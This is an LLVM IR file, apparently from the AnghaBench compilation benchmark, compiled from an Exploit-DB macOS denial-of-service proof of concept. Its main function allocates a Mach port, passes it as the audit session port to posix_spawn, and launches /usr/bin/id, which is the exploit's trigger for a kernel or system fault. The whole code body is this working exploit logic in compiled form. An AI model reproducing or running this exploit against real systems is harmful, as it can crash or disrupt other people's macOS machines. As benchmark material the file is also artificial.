; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/macos/dos/extr_41791.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/macos/dos/extr_41791.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@MACH_PORT_NULL = common dso_local global i32 0, align 4
@MACH_PORT_RIGHT_RECEIVE = common dso_local global i32 0, align 4
@MACH_MSG_TYPE_MAKE_SEND = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [12 x i8] c"/usr/bin/id\00", align 1
@__const.main._argv = private unnamed_addr constant [2 x i8*] [i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str, i32 0, i32 0), i8* null], align 16

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca [2 x i8*], align 16
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = load i32, i32* @MACH_PORT_NULL, align 4
  store i32 %6, i32* %1, align 4
  %7 = call i32 (...) @mach_task_self()
  %8 = load i32, i32* @MACH_PORT_RIGHT_RECEIVE, align 4
  %9 = call i32 @mach_port_allocate(i32 %7, i32 %8, i32* %1)
  %10 = call i32 (...) @mach_task_self()
  %11 = load i32, i32* %1, align 4
  %12 = load i32, i32* %1, align 4
  %13 = load i32, i32* @MACH_MSG_TYPE_MAKE_SEND, align 4
  %14 = call i32 @mach_port_insert_right(i32 %10, i32 %11, i32 %12, i32 %13)
  %15 = call i32 @posix_spawnattr_init(i32* %2)
  %16 = load i32, i32* %1, align 4
  %17 = call i32 @posix_spawnattr_setauditsessionport_np(i32* %2, i32 %16)
  %18 = bitcast [2 x i8*]* %3 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %18, i8* align 16 bitcast ([2 x i8*]* @__const.main._argv to i8*), i64 16, i1 false)
  store i32 0, i32* %4, align 4
  %19 = getelementptr inbounds [2 x i8*], [2 x i8*]* %3, i64 0, i64 0
  %20 = call i32 @posix_spawn(i32* %4, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str, i64 0, i64 0), i32* null, i32* %2, i8** %19, i32* null)
  store i32 %20, i32* %5, align 4
  ret i32 0
}

declare dso_local i32 @mach_port_allocate(i32, i32, i32*) #1

declare dso_local i32 @mach_task_self(...) #1

declare dso_local i32 @mach_port_insert_right(i32, i32, i32, i32) #1

declare dso_local i32 @posix_spawnattr_init(i32*) #1

declare dso_local i32 @posix_spawnattr_setauditsessionport_np(i32*, i32) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #2

declare dso_local i32 @posix_spawn(i32*, i8*, i32*, i32*, i8**, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind willreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
